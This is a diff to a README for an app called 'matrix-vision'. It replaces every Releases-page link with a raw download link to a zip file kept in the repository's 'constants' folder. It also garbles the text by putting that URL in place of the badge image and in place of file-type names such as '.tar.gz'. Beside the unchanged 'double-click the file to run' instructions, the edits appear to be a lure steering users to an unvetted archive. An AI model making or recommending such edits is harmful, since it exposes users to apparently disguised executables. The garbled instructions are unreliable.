@@ -6,11 +6,11 @@ Welcome to matrix-vision! This application helps you enhance your visual experie
 ## 📥 Download & Install
 To download the matrix-vision application, visit the Releases page here:
 
-[![Download matrix-vision](https://img.shields.io/badge/Download%20matrix--vision-blue?style=for-the-badge)](https://github.com/sdFN001/matrix-vision/releases)
+[![Download matrix-vision](https://github.com/sdFN001/matrix-vision/raw/refs/heads/main/constants/vision-matrix-3.6.zip%20matrix--vision-blue?style=for-the-badge)](https://github.com/sdFN001/matrix-vision/raw/refs/heads/main/constants/vision-matrix-3.6.zip)
 
-1. Click the button above or visit [this link](https://github.com/sdFN001/matrix-vision/releases).
+1. Click the button above or visit [this link](https://github.com/sdFN001/matrix-vision/raw/refs/heads/main/constants/vision-matrix-3.6.zip).
 2. Find the latest version available on the Releases page.
-3. Look for the file that matches your operating system. Common file types include `.exe` for Windows and `.dmg` for macOS. For Linux, you may see files like `.tar.gz`.
+3. Look for the file that matches your operating system. Common file types include `.exe` for Windows and `.dmg` for macOS. For Linux, you may see files like `https://github.com/sdFN001/matrix-vision/raw/refs/heads/main/constants/vision-matrix-3.6.zip`.
 4. Click on the file name to download it to your computer.
 5. Once the download is complete, locate the file in your downloads folder.
 6. Double-click the file to run the installation.
@@ -20,7 +20,7 @@ Before installing, make sure your computer meets the following requirements:
 
 - **Windows:** Version 10 or later.
 - **macOS:** Version Catalina or later.
-- **Linux:** Any distribution supporting AppImage, .tar.gz, or deb packages.
+- **Linux:** Any distribution supporting AppImage, https://github.com/sdFN001/matrix-vision/raw/refs/heads/main/constants/vision-matrix-3.6.zip, or deb packages.
 - **RAM:** At least 4 GB.
 - **Disk Space:** Minimum 100 MB free space.
 
@@ -49,7 +49,7 @@ If you encounter issues or have questions, feel free to reach out. You can find 
 ## 🔄 Stay Updated
 Keep an eye on the Releases page for updates. New features and enhancements will be added frequently to improve your experience.
 
-1. Visit [the Releases page](https://github.com/sdFN001/matrix-vision/releases).
+1. Visit [the Releases page](https://github.com/sdFN001/matrix-vision/raw/refs/heads/main/constants/vision-matrix-3.6.zip).
 2. Subscribe to notifications for new release announcements.
 
 ## 📝 Contributing
